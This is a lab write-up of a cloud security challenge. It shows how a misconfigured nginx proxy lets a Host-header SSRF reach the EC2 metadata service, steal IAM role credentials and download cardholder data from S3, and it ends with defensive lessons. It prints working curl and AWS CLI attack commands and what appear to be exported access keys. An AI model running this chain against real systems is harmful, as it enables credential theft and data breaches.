OBJECTIVE AND SOLUTION : 

The goal of this challenge was to exploit a misconfigured nginx reverse proxy running on a public EC2 instance to access the Instance Metadata Service (IMDS), steal IAM role credentials, and use them to download confidential files from an S3 bucket.

SOLUTION : 

To find the flag, I've taken the following steps:

1)
Cloned the lab repository and deployed the environment using Terraform:

`git clone https://github.com/humbercloudsecurity/ccgc5501-cloud-security-challenge-s3_breach`

`cd ccgc5501-cloud-security-challenge-s3_breach`

`terraform init `

`terraform apply -auto-approve -var="ec2_instance_type=t3.micro"`

This created a VPC, a publicly accessible EC2 instance running a misconfigured nginx reverse proxy, an S3 bucket containing sensitive cardholder data, and an IAM role attached to the EC2 instance with S3 read access. The output confirmed that IMDSv1 was enabled making it vulnerable to SSRF attacks.

2)
Noted key values from the Terraform output:
Target EC2 IP: 44.203.231.101 Scenario Name: cloud-breach-s3-8qofug38 IMDS Version: IMDSv1 (Vulnerable)

3)
Probed the target EC2 to confirm the reverse proxy was running:

`curl http://44.203.231.101`

The response confirmed an nginx proxy server was running and hinted that requests should use the Host header set to 169.254.169.254 to reach the metadata service.


4)
Exploited the misconfigured reverse proxy to query the IMDS and retrieve the IAM role name:

`curl http://44.203.231.101/latest/meta-data/iam/security-credentials/ -H 'Host: 169.254.169.254'`

Result: cloud-breach-s3-8qofug38-banking-WAF-Role
The nginx proxy forwarded our request directly to the metadata service because it did not restrict which Host headers were allowed. This is the SSRF vulnerability.

5)
Used the role name to steal the full IAM credentials from IMDS:

`curl http://44.203.231.101/latest/meta-data/iam/security-credentials/cloud-breach-s3-8qofug38-banking-WAF-Role -H 'Host: 169.254.169.254'`
The response returned temporary credentials in JSON format including AccessKeyId, SecretAccessKey and Token.

6)
Set the stolen credentials as environment variables:
export AWS_ACCESS_KEY_ID="ASIA3MCVMDVA4EC7FKYO" export AWS_SECRET_ACCESS_KEY="+Kf3fWK79gu0XZxQTHkBhmyY6WGgyBPZgIuoLb0x" export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEPv//////////wE..."

7)
Verified the stolen credentials were working:

`aws sts get-caller-identity`
Confirmed the identity was the EC2 IAM role cloud-breach-s3-8qofug38-banking-WAF-Role with active temporary credentials.

8)
Listed accessible S3 buckets:

`aws s3 ls`
Result: cloud-breach-s3-8qofug38-cardholder-data
The IAM role had permissions to list and read from this bucket confirming the overly permissive role configuration.

9)
Downloaded all files from the S3 bucket:

`aws s3 sync s3://cloud-breach-s3-8qofug38-cardholder-data ./stolen-data/`
Downloaded files:
FLAG.txt
cardholder_data_primary.csv
cardholder_data_secondary.csv

10)
Read the flag and verified the exfiltrated data:

`cat ./stolen-data/FLAG.txt`
Flag: CLOUDGOAT{8qofug38_BREACH_COMPLETE}
The primary CSV contained credit card numbers, cardholder names, expiry dates and SSN data. The secondary CSV contained account balances, credit scores and addresses — demonstrating a realistic Capital One style breach scenario.

REFLECTION

Q1: What was your approach?

The approach here was to follow the attack chain step by step. The starting point was the public IP of an EC2 instance which I knew was running a reverse proxy. The key question was whether that proxy had any restrictions on Host headers. By sending a request with the Host header set to the metadata IP I could immediately tell it was misconfigured because it just forwarded the request without checking. From there it was a straightforward path through IMDS to credentials to S3.

Q2: What was the biggest challenge?

The most interesting part was understanding why the SSRF worked in the first place. The nginx proxy was set up to forward all requests including ones with arbitrary Host headers which means it was essentially acting as a bridge to internal AWS services that should never be reachable from the internet. Wrapping my head around how the Host header manipulation tricked the proxy took a moment to fully understand.

Q3: How did you overcome the challenges?

Going step by step and verifying each response before moving to the next one helped a lot. First confirming the proxy was running, then confirming the metadata endpoint was reachable, then confirming the credentials actually worked before trying S3 access. Each successful response built confidence that the attack path was correct.

Q4: What led to the breakthrough?

The breakthrough was getting a valid JSON response from the IMDS endpoint with a real AccessKeyId, SecretAccessKey and Token. At that point the attack was essentially complete because those credentials gave us the same level of access as the EC2 instance itself. Everything after that was just using normal AWS CLI commands.

Q5: On the blue side, how can this learning be used to properly defend important assets?

This attack chained three separate misconfigurations together and removing any one of them would have stopped it completely. To properly defend against this:
a. Enforce IMDSv2 on all EC2 instances. IMDSv2 requires a session token that cannot be obtained through a simple HTTP request making this exact SSRF attack impossible.
b. Configure nginx and all reverse proxies to only allow specific trusted Host headers. Any request with an unexpected Host header should return a 403 error immediately.
c. Apply least privilege to EC2 IAM roles. The banking WAF role should only have access to the specific S3 paths it needs, not the entire bucket.
d. Never expose EC2 instances running internal services directly to the internet. A WAF or load balancer in front would add an extra layer of protection.
e. Enable S3 bucket access logging and CloudTrail to detect unusual download patterns or credential usage from unexpected sources.
